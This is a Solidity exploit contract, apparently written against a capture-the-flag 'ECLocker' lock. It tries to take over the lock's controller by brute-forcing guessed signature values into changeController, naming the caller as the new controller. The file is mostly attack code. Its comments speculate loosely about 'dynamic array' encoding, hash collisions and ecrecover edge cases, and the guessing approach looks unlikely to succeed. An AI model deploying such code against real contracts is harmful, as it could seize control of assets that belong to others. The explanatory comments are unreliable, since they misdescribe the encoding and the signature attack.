// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function controller() external view returns (address);
    function lockId() external view returns (uint256);
    function msgHash() external view returns (bytes32);
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function open(uint8 v, bytes32 r, bytes32 s) external;
    function usedSignatures(bytes32) external view returns (bool);
}

contract AdvancedExploit {
    
    function findExploit(address locker) external returns (bool) {
        IECLocker lock = IECLocker(locker);
        
        // The bug is that signature hash is computed as:
        // keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]))
        
        // This creates a dynamic array encoding
        // The encoding structure makes it possible to have collisions
        
        // Let's try to find a signature that works
        
        // First, let's understand that ecrecover might return unexpected results
        // with certain edge case inputs
        
        // Try malleability attack - flip s value
        bytes32 halfN = 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;
        
        // Try different combinations
        if (trySignature(lock, 27, bytes32(uint256(1)), bytes32(uint256(1)))) return true;
        if (trySignature(lock, 28, bytes32(uint256(1)), bytes32(uint256(1)))) return true;
        
        // Try with higher values
        for (uint256 i = 1; i < 100; i++) {
            if (trySignature(lock, 27, bytes32(i), bytes32(i))) return true;
            if (trySignature(lock, 28, bytes32(i), bytes32(i))) return true;
        }
        
        // Try edge cases with ecrecover
        // When s > N/2, ecrecover might behave differently
        if (trySignature(lock, 27, halfN, halfN)) return true;
        if (trySignature(lock, 28, halfN, halfN)) return true;
        
        // Try max values
        if (trySignature(lock, 27, bytes32(type(uint256).max), bytes32(type(uint256).max))) return true;
        if (trySignature(lock, 28, bytes32(type(uint256).max), bytes32(type(uint256).max))) return true;
        
        return false;
    }
    
    function trySignature(IECLocker lock, uint8 v, bytes32 r, bytes32 s) internal returns (bool) {
        try lock.changeController(v, r, s, msg.sender) {
            return true;
        } catch {
            return false;
        }
    }
    
    // Let's also try to understand the hash collision potential
    function analyzeHashCollision() external pure returns (bytes32, bytes32, bool) {
        // Due to the array encoding, different values might produce the same hash
        bytes32 hash1 = keccak256(abi.encode([uint256(1), uint256(2), uint256(27)]));
        bytes32 hash2 = keccak256(abi.encode([uint256(1), uint256(2), uint256(28)]));
        
        // These should be different, but let's see
        return (hash1, hash2, hash1 == hash2);
    }
}